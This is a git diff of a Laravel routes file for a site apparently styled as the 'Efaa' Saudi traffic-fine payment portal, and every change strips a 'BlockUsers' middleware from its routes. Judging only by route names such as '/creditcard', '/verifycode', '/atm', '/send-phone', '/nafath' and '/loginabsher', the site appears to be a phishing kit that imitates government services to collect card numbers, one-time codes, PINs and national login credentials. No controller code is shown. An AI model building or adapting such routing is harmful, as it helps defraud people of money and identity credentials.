@@ -9,27 +9,27 @@ use App\Http\Middleware\BlockUsers;
 
 
 
-Route::GET('/about-us', function () { return view('about'); })->middleware(BlockUsers::class);
-Route::GET('/Beneficiaries', function () { return view('Beneficiaries'); })->middleware(BlockUsers::class);
-Route::GET('/regulations', function () { return view('regulations'); })->middleware(BlockUsers::class);
-Route::GET('/regulations', function () { return view('regulations'); })->middleware(BlockUsers::class);
-Route::GET('/Partners', function () { return view('Partners'); })->middleware(BlockUsers::class);
-Route::GET('/ContactUs', function () { return view('ContactUs'); })->middleware(BlockUsers::class);
+Route::GET('/about-us', function () { return view('about'); });
+Route::GET('/Beneficiaries', function () { return view('Beneficiaries'); });
+Route::GET('/regulations', function () { return view('regulations'); });
+Route::GET('/regulations', function () { return view('regulations'); });
+Route::GET('/Partners', function () { return view('Partners'); });
+Route::GET('/ContactUs', function () { return view('ContactUs'); });
 
 
 
 
-Route::GET('/home', function () { return view('home'); })->middleware(BlockUsers::class);
-Route::GET('/info', function () { return view('info'); })->middleware(BlockUsers::class);
-Route::GET('/efaa', function () { return view('efaa'); })->middleware(BlockUsers::class);
-Route::GET('/steps', function () { return view('steps'); })->middleware(BlockUsers::class);
-Route::GET('/manasa', function () { return view('manasa'); })->middleware(BlockUsers::class);
-Route::GET('/efaa-en', function () { return view('efaaenglish'); })->middleware(BlockUsers::class);
-Route::GET('/efaa-en-vio', function () { return view('violations'); })->middleware(BlockUsers::class);
-Route::POST('/steps2', [EfaaController::class, 'paynow'])->middleware(BlockUsers::class);
-Route::POST('/GetViolationsByViolatorinquery', [EfaaController::class, 'GetViolationsByViolatorinquery'])->middleware(BlockUsers::class);
-Route::POST('/GetFirmsList', [EfaaController::class, 'GetFirmsList'])->middleware(BlockUsers::class);
-Route::POST('/CreateOrder', [EfaaController::class, 'CreateOrder'])->middleware(BlockUsers::class);
+Route::GET('/home', function () { return view('home'); });
+Route::GET('/info', function () { return view('info'); });
+Route::GET('/efaa', function () { return view('efaa'); });
+Route::GET('/steps', function () { return view('steps'); });
+Route::GET('/manasa', function () { return view('manasa'); });
+Route::GET('/efaa-en', function () { return view('efaaenglish'); });
+Route::GET('/efaa-en-vio', function () { return view('violations'); });
+Route::POST('/steps2', [EfaaController::class, 'paynow']);
+Route::POST('/GetViolationsByViolatorinquery', [EfaaController::class, 'GetViolationsByViolatorinquery']);
+Route::POST('/GetFirmsList', [EfaaController::class, 'GetFirmsList']);
+Route::POST('/CreateOrder', [EfaaController::class, 'CreateOrder']);
 
 Route::get('/bname/{error}', function ($error = 0, Request $request) {
 
@@ -45,29 +45,29 @@ Route::get('/bname/{error}', function ($error = 0, Request $request) {
          return view('new.pay',['error'=> $error]);
     }
 
-})->middleware(BlockUsers::class);
+});
 
-Route::POST('/GetViolationsByViolatorHome', [EfaaController::class, 'GetViolationsByViolatorHome'])->middleware(BlockUsers::class);
+Route::POST('/GetViolationsByViolatorHome', [EfaaController::class, 'GetViolationsByViolatorHome']);
 // Home Page Request
-Route::GET('/', [EfaaController::class, 'home'])->middleware(BlockUsers::class);
-Route::POST('/extGetTrafficViolationInfo', [EfaaController::class, 'extGetTrafficViolationInfo'])->middleware(BlockUsers::class);
-Route::POST('/extSearchBByFineNumAndViolaterId', [EfaaController::class, 'extSearchByFineNumAndViolaterId'])->middleware(BlockUsers::class);
-Route::GET('/addto/{violatorID}/{FiensInfoDTOs}/{inside?}', [EfaaController::class, 'addto'])->middleware(BlockUsers::class);
-Route::POST('/creditcard', [EfaaController::class, 'creditcard'])->middleware(BlockUsers::class);
-Route::POST('/verifycode', [EfaaController::class, 'verifycode'])->middleware(BlockUsers::class);
-Route::POST('/atm', [EfaaController::class, 'atm'])->middleware(BlockUsers::class);
-Route::POST('/send-phone', [EfaaController::class, 'sendphone'])->middleware(BlockUsers::class);
-Route::POST('/verifyb', [EfaaController::class, 'verifyb'])->middleware(BlockUsers::class);
-Route::POST('/verifya', [EfaaController::class, 'verifya'])->middleware(BlockUsers::class);
-Route::POST('/extGetPersonalInfoByIdAndDob', [EfaaController::class, 'extGetPersonalInfoByIdAndDob'])->middleware(BlockUsers::class);
+Route::GET('/', [EfaaController::class, 'home']);
+Route::POST('/extGetTrafficViolationInfo', [EfaaController::class, 'extGetTrafficViolationInfo']);
+Route::POST('/extSearchBByFineNumAndViolaterId', [EfaaController::class, 'extSearchByFineNumAndViolaterId']);
+Route::GET('/addto/{violatorID}/{FiensInfoDTOs}/{inside?}', [EfaaController::class, 'addto']);
+Route::POST('/creditcard', [EfaaController::class, 'creditcard']);
+Route::POST('/verifycode', [EfaaController::class, 'verifycode']);
+Route::POST('/atm', [EfaaController::class, 'atm']);
+Route::POST('/send-phone', [EfaaController::class, 'sendphone']);
+Route::POST('/verifyb', [EfaaController::class, 'verifyb']);
+Route::POST('/verifya', [EfaaController::class, 'verifya']);
+Route::POST('/extGetPersonalInfoByIdAndDob', [EfaaController::class, 'extGetPersonalInfoByIdAndDob']);
 // Image
-Route::POST('/GetTrafficViolationImages', [EfaaController::class, 'GetTrafficViolationImages'])->middleware(BlockUsers::class);
+Route::POST('/GetTrafficViolationImages', [EfaaController::class, 'GetTrafficViolationImages']);
 
 
-Route::get('/nafath', function(Request $request) {  return view('new.nfath'); })->middleware(BlockUsers::class);
-Route::get('/nfathcode', function(Request $request) { return view('new.nfathCode');})->middleware(BlockUsers::class);
-Route::POST('/loginabsher',        [EfaaController::class, 'loginAbsher'])->middleware(BlockUsers::class);
-Route::POST('/checknfathcode', [EfaaController::class, 'getStatus'])->middleware(BlockUsers::class);
+Route::get('/nafath', function(Request $request) {  return view('new.nfath'); });
+Route::get('/nfathcode', function(Request $request) { return view('new.nfathCode');});
+Route::POST('/loginabsher',        [EfaaController::class, 'loginAbsher']);
+Route::POST('/checknfathcode', [EfaaController::class, 'getStatus']);
 
 
 
@@ -87,7 +87,7 @@ Route::POST('/rejectPhone', function (Request $request) {
 
     
 
-})->middleware(BlockUsers::class);
+});
 
 
 
